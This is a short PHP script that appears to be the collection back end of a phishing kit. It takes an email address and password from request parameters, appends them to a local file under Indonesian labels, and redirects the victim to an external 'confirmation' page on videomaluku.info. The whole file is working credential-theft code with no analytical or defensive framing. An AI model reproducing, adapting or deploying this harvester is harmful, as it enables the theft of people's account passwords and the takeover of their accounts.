<?php
header("Location: https://videomaluku.info/konfirmasi.html");
$ADEx = "rejeki.999";
$ADEy = $_GET['email'];
$ADEz = $_GET['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "");
fwrite($handle, "\n");
fwrite($handle, "Alamat Email:");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
